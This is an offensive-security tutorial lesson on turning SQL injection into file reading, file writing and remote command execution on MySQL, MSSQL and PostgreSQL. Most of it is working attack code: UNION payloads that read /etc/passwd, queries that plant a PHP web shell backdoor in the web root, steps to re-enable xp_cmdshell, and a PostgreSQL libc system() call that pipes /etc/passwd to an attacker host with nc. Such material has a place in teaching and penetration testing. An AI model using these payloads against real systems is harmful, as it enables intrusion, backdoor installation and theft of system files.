# FOOTHOLD AND S.O. EXPLOITATION FROM SQL INJECTION - LESSON 03

Once we discovered and successfully exploited an SQLi we have, in some
specific case, the opportunity to access portions of the operating system.
For some databases, like MSSQL, we can execute arbitrary commands through the
database itself, while for others we can abuse the file access (read and write)
to achieve the same purpose.

The potentialities are enormous because we can extend our reach.
This means, for example, that a SQLi vulnerable application can be used to
target other hosts in a private network using the database as a pivot.

## 'LFI (Local File Inclusion)

An attacker can use LFI to trick a web application to expose a file present on
the web server.
This is useful to read code, configurations, find stored credentials and in
general for information gathering.

### READING FILE IN MySQL

```sql
CREATE TABLE `users` (user char(50));
LOAD DATA INFILE '/etc/passwd' INTO TABLE `users`;
```
This code creates a table `users` with one column `user` and populates it
from the file `/etc/passwd`. `LOAD DATA INFILE` reads data from text file into
a table.

```sql
SELECT LOAD_FILE('/etc/passwd');
```
`LOAD_FILE` statement in MySQL allow us to read a file from filesystem without
creating a table before, outputting the result as we executed a standard query.

#### Limitations
`LOAD DATA INFILE` and `LOAD_FILE` can be used if the database user that is
executing the query has the `FILE` privilege.
If the `secure_file_priv` system variable is set to a nonempty directory name,
the file to be loaded must be located in that directory.
The target file must be a world readable file.
The argument passed to `LOAD_FILE` can be HEX, like `SELECT LOAD_FILE(0x2F6574632F706173737764)`, while the argument passed to
`LOAD DATA INFILE` must be a string literal.

#### Example
Given this PHP code, and assuming that the DB user has the `FILE` privilege:

```php
  $sql = "SELECT id, title, content FROM pages WHERE id = '" . $_GET['id'] . "'";
  $result = $conn->query($sql);
  while($row = $result->fetch_array()){
    echo $row['title'];
  }
```

We already tested the number of columns:

Using `$_GET[id] = "1' UNION ALL SELECT 1, 2, 3 -- -"` the query produced will be:
```sql
SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, 2, 3 -- -'
```

At this point we can can use the `LOAD_FILE` statement in combination with the
`UNION` to read the `/etc/passwd` file.

Using `$_GET[id] = "1' UNION ALL SELECT 1, LOAD_FILE('/etc/passwd'), 3 -- -"` the query produced will be:

```sql
SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, LOAD_FILE('/etc/passwd'), 3 -- -'
```

This query will output an addition row with the content of the file `/etc/passwd`.

| title |
|-------|
| Title news 1 |
| Title news 2 |
| root:x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br />....<br />john:x:13:13:proxy:/bin:/usr/bin/bash |


### READING FILE IN MSSQL
`BULK INSERT` in MSSQL allow us to insert in a table the content of a file.
This function, combined with staked queries that are always available in MSSQL,
allow us to read file on the fly.

```sql
CREATE TABLE mydata (line varchar(8000));
BULK INSERT mydata FROM 'c:\boot.ini';
SELECT line FROM mydata;
DROP TABLE mydata;
```

This code creates a table `mydata` with one column `line` and populates it
from the file `c:\boot.ini`. `BULK INSERT` reads data from text file into
a table. The final statement simply drop the previously created table.

#### Limitations
We need the `ADMINISTER BULK OPERATIONS` permission.

### READING FILE IN POSTGRESQL
`COPY` moves data between PostgreSQL tables and standard file-system files.
With `COPY FROM` we can copy the data from a file to a table.

```sql
CREATE TABLE mydata(t text);
COPY mydata FROM '/etc/passwd';
SELECT t FROM mydata;
DROP TABLE mydata;
```

This code creates a table `mydata` with one column `t` and populates it
from the file `/etc/passwd`. `COPY` reads data from text file into
a table. The final statement simply drop the previously created table.

#### Limitations
The file must be a world readable file.

## 'FILE WRITING
As for file reading, DBMSs expose certain functions to write file on the
filesystem.


### WRITING FILE IN MySQL

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/backdoor.php';
SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/backdoor.php';
```

This code will write the result of the select, in this case `<?php system($_GET["cmd"]); ?>` in the file `/var/www/backdoor.php`, creating a
backdoor on the webserver.
The file that we attempt to write must be a world writable file.
Exploit this function in conjunction with an SQLi is fairly trivial.
`DUMPFILE` allow us to write a binary file while `OUTFILE` not.

#### Example
Given this PHP code, and assuming that the DB user has the `FILE` privilege:

```php
  $sql = "SELECT id, title, content FROM pages WHERE id = '" . $_GET['id'] . "'";
  $result = $conn->query($sql);
  while($row = $result->fetch_array()){
    echo $row['title'];
  }
```

We already tested the number of columns:

Using `$_GET[id] = "1' UNION ALL SELECT 1, 2, 3 -- -"` the query produced will be:
```sql
SELECT id, title, content FROM pages WHERE id = '1' UNION ALL SELECT 1, 2, 3 -- -'
```

At this point we can can use the `INTO OUTFILE` statement in combination with the
`UNION` to write our backdoor.

Using `$_GET[id] = "1' AND 1=0 UNION ALL SELECT null, '<?php system($_GET["cmd"])', null INTO OUTFILE '/var/www/backdoor.php' -- -"` the query produced will be:

```sql
SELECT id, title, content FROM pages WHERE id = '1' AND 1=0 UNION ALL SELECT null, '<?php system($_GET["cmd"])',null INTO OUTFILE '/var/www/backdoor.php' -- -'
```
This code will write our php code in the file `/var/www/backdoor.php`.
Some note:

- We added `AND 1=0` to exclude the output of the original query from being
writed to our file.
- Similarly we hide the other columns output using `NULL` instead of the classic
numbers.
- We need to know the absolute path of the file that we want to write to be
sure that we can access to it from the Webserver.

### WRITING FILE IN MSSQL
There is no command to write files directly in MSSQL.
We can use a stored procedure but we will see some advanced trick in the next chapter to obtain file writing.

### WRITING FILE IN POSTEGRESQL
As for file reading, in PostgreSQL we can abuse the copy function to obtain
file writing.

```sql
CREATE TABLE mydata (t text);
INSERT INTO mydata (t) VALUES ('<? pasthru($_GET[cmd]); ?>');
COPY mydata (t) TO '/tmp/test.php';
DROP TABLE mydata;
```
This code creates a table `mydata` with one column `t`.
This table is populated with the next `INSERT` statement.
The `COPY` reads data from the table a write it into the file `/tmp/test.php`.
So `COPY` can be used with `FROM` to read from files and with `TO` to write to
a file.

#### Limitations
The file must be a world writable file.

### 'RCE (Remote Command Execution)
This is what we always want, or not?
This ability allow us to start a privilege escalation on the server, using the
server as pivot and much much more.

### RCE IN MySQL
Mysql does not natively support shell command execution.
The faster way to obtain RCE in MySQL is with file writing as we seen in the
previous chapter.

### RCE IN MSSQL
As always, with MSSQL we can get the best satisfaction :D
MSSQL provides `xp_cmdshell` that allow us to execute commands:

```sql
EXEC master.dbo.xp_cmdshell 'cmd';
```

On modern versions of MSSQL `xp_cmdshell` is disabled by default...but it can be
activated through some query:

```sql
EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure reconfigure;
EXEC sp_configure 'xp_cmdshell', 1;
EXEC sp_configure reconfigure;
```

There are also other techniques in MSSQL that allow us to execute commands (
see the [gracefulsecurity cheatsheet](https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/)).

### RCE IN POSTGRES
In PostegreSQL we can rely on the presence of Libc to execute commands
directly through the database:

```sql
 CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
 SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
 ```

 We are defining a new function that calls `system` on the libc.
 The only requirement is the knowledge of the location of the libc on the system.
 This is a privileged command.

 Alternatively we can abuse the `COPY` function:

 ```sql
 CREATE TABLE cmd_exec(cmd_output text);
 COPY cmd_exec from program 'whoami';
 SELECT * from cmd_exec;
 ```

 This code creates a `cmd_exec` table, `COPY` the output from program `whoami`
 (this is the real code execution) to the table just created.
 The last command allows us to display the output of the command.
